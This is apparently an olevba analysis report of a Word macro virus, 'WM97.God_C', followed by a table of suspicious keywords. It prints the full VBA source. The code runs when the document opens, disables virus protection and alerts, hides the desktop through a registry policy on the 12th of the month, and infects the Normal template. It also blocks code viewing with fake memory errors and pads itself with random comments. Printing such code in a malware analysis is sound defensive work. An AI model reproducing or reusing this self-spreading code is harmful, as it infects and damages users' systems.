olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.God.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.God.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
' test.doc 5/29/01 3:54:14 PM
With Options
.AllowFastSave = False
.VirusProtection = False
' test.doc 5/29/01 3:54:14 PM
.SaveNormalPrompt = False
' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM
End With
With Application
.Caption = "Microsoft Wörd -God"
.DisplayAlerts = wdAlertsNone
.Assistant.Visible = True
.Assistant.Animation = msoAnimationGreeting
End With
With Application.Assistant.NewBalloon
.Text = "Autor: Zerø|<LzØ>"
.Heading = "This is WM97.God_C"
.Show
End With
If Day(Now) = 12 Then
'God
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1
End If
Infection
End Sub
Sub Infection()
Set AD = ActiveDocument.VBProject.VBComponents
Set NT = NormalTemplate.VBProject.VBComponents
Path_ = "C:\Progra~1\God32.sys"
For i = 1 To NT.Count
If NT(i).Name = "God" Then
' test.doc 5/29/01 3:54:14 PM
NorInst = True
End If
Next i
For i = 1 To AD.Count
If AD(i).Name = "God" Then
DokInst = True
' test.doc 5/29/01 3:54:14 PM
End If
Next i
' test.doc 5/29/01 3:54:14 PM
If DokInst = True And NorInst = False Then
NT.Import Path_
End If
' test.doc 5/29/01 3:54:14 PM
If DokInst = False And NorInst = True Then
AD.Import Path
End If
' test.doc 5/29/01 3:54:14 PM
JCE
' test.doc 5/29/01 3:54:14 PM
End Sub
Sub DateiSpeichernUnter()
Infection
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DateiSpeichern()
' test.doc 5/29/01 3:54:14 PM
Infection
ActiveDocument.SaveAs ActiveDocument.FullName
' test.doc 5/29/01 3:54:14 PM
End Sub
Sub DateiDokVorlagen()
MsgBox "Zu wenig Arbeitsspeicher um Anwendung auszuführen!", vbCritical
End Sub
Sub AnsichtCode()
MsgBox "Zu wenig Arbeitsspeicher um Anwendung auszuführen!", vbCritical
' test.doc 5/29/01 3:54:14 PM
End Sub
Sub AnsichtVBCode()
MsgBox "Zu wenig Arbeitsspeicher um Anwendung auszuführen!", vbCritical
End Sub
' test.doc 5/29/01 3:54:14 PM
Sub ExtrasMakro()
MsgBox "Zu wenig Arbeitsspeicher um Anwendung auszuführen!", vbCritical
End Sub
Sub JCE()
Set NT = NormalTemplate.VBProject.VBComponents
LS = NT("ThisDocument").CodeModule.CountOfLines
If LS < 200 Then
For x = 1 To Int((Rnd * 50) + 1)
LE = Int(Rnd() * LS + 1)
' test.doc 5/29/01 3:54:14 PM
IT = "'" & Application.ActivePrinter & " " & Application.ActiveDocument & " " & Now
NT("ThisDocument").CodeModule.InsertLines LE, IT
Next x
End If
' test.doc 5/29/01 3:54:14 PM
End Sub




' test.doc 5/29/01 3:54:14 PM

' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM


' test.doc 5/29/01 3:54:14 PM



' test.doc 5/29/01 3:54:14 PM

' test.doc 5/29/01 3:54:14 PM
















' test.doc 5/29/01 3:54:14 PM


' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM






' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM


' test.doc 5/29/01 3:54:14 PM

' test.doc 5/29/01 3:54:14 PM



' test.doc 5/29/01 3:54:14 PM



' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM
' test.doc 5/29/01 3:54:14 PM









' test.doc 5/29/01 3:54:14 PM




' test.doc 5/29/01 3:54:14 PM




















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

